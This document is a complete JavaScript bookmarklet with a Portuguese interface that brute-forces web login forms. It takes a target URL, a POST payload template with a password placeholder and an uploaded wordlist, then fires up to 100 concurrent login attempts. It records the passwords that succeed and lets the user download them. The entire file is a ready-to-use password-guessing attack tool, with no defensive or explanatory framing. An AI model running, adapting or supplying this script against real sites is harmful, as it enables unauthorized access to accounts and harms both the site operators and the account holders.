javascript:(function(){
if(document.getElementById('xBFPro')) return;

let d = document.createElement('div');
d.id = 'xBFPro';
d.style = 'position:fixed;top:20px;right:20px;z-index:999999;background:#1e1e1e;color:#f1f1f1;padding:20px;border-radius:12px;box-shadow:0 4px 24px #0009;font:14px sans-serif;width:480px;max-height:90vh;overflow:auto;';

d.innerHTML = `
  <div style="font-size:16px;font-weight:bold;margin-bottom:10px;color:#0ff;">🚀 Força Bruta POST Pro</div>

  <label style="font-weight:bold;display:block;margin-top:6px;">🌐 URL alvo:</label>
  <input id="bfProUrl" placeholder="Ex: https://site.com/login (vazio = atual)" style="width:100%;margin:4px 0 10px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0ff;font-family:monospace;">

  <label style="font-weight:bold;display:block;margin-top:6px;">🔑 Payload:</label>
  <textarea id="bfProPayload" placeholder="Ex: user=admin&pass=^PASS^" style="width:100%;margin:4px 0 10px;height:70px;padding:6px;border-radius:6px;border:1px solid #444;background:#111;color:#0f0;font-family:monospace;"></textarea>

  <label style="font-weight:bold;display:block;margin-top:6px;">📂 Arquivo Wordlist (.txt):</label>
  <input type="file" id="bfProFile" accept=".txt" style="display:block;margin:6px 0 12px;padding:6px;border-radius:6px;background:#222;border:1px solid #444;color:#fff;">

  <label style="font-weight:bold;display:block;margin-top:6px;">⚡ Configurações:</label>
  <input type="number" id="bfProThreads" value="10" min="1" max="100" style="width:60px;margin-right:8px;"> Threads simultâneas
  <label><input type="checkbox" id="bfProNoReload"> Sem recarregar após sucesso</label>

  <div style="margin-top:10px;display:flex;gap:6px;flex-wrap:wrap;">
    <button id="bfProStart" style="flex:1;background:#28a745;border:none;border-radius:6px;padding:10px;color:#fff;font-weight:bold;cursor:pointer;">▶️ Iniciar</button>
    <button id="bfProDownload" style="flex:1;background:#007bff;border:none;border-radius:6px;padding:10px;color:#fff;font-weight:bold;cursor:pointer;display:none;">⬇️ Resultados</button>
    <button id="bfProClose" style="background:#911;border:none;border-radius:6px;padding:10px 14px;color:#fff;font-weight:bold;cursor:pointer;">✖</button>
  </div>

  <label style="font-weight:bold;display:block;margin:10px 0 4px;">📜 Logs:</label>
  <div id="bfProLog" style="background:#000;height:250px;overflow:auto;padding:10px;font-family:monospace;font-size:12px;line-height:1.4;border-radius:6px;border:1px solid #444;white-space:pre-wrap;">Aguardando início...</div>
`;
document.body.appendChild(d);

let $ = id => document.getElementById(id);
$('bfProClose').onclick = () => d.remove();

let resultados = [];
$('bfProDownload').onclick = () => {
  if(resultados.length===0){alert('Nenhum resultado!'); return;}
  let content = resultados.join('\n');
  let a = document.createElement('a');
  a.href = URL.createObjectURL(new Blob([content], {type:'text/plain'}));
  a.download = 'bf_results.txt';
  a.click();
};

$('bfProStart').onclick = () => {
  let payload = $('bfProPayload').value.trim();
  let file = $('bfProFile').files[0];
  let threads = parseInt($('bfProThreads').value) || 10;
  let noReload = $('bfProNoReload').checked;
  let url = $('bfProUrl').value.trim() || location.href;

  if(!payload || !file){alert('Preencha payload e selecione arquivo!'); return;}
  
  resultados = [];
  $('bfProDownload').style.display='none';
  $('bfProLog').innerText = `🚀 Iniciando...\nAlvo: ${url}\nThreads: ${threads}\n`;

  let reader = new FileReader();
  reader.onload = () => {
    let lines = reader.result.split(/\r?\n/).filter(l => l.trim());
    let idx = 0, active = 0;

    const tryNext = () => {
      while(active < threads && idx < lines.length){
        let currentPass = lines[idx++];
        active++;
        let fd = new URLSearchParams();
        payload.replace(/\^PASS\^/g, currentPass).split('&').forEach(s=>{
          let a = s.split('=');
          fd.append(decodeURIComponent(a[0]||''), decodeURIComponent(a[1]||''));
        });

        fetch(url, {method:'POST', body: fd, redirect:'manual'})
        .then(r=>{
          let msg = `[${r.status}] ${r.statusText} → ${currentPass}`;
          if(r.status >= 200 && r.status < 300){
            msg = "✅ SUCESSO "+msg;
            resultados.push(`${url} | Payload: ${payload.replace(/\^PASS\^/g,currentPass)} | Senha: ${currentPass}`);
            $('bfProDownload').style.display='inline-block';
            if(!noReload) location.reload();
          } else msg = "❌ FALHA "+msg;

          $('bfProLog').innerText += msg + '\n';
          active--;
          tryNext();
          $('bfProLog').scrollTop = $('bfProLog').scrollHeight;
        })
        .catch(e=>{
          $('bfProLog').innerText += `⚠️ ERRO: ${e}\n`;
          active--;
          tryNext();
          $('bfProLog').scrollTop = $('bfProLog').scrollHeight;
        });
      }
      if(idx>=lines.length && active===0){
        $('bfProLog').innerText += '✅ Finalizado\n';
      }
    };
    tryNext();
  };
  reader.readAsText(file);
};
})();
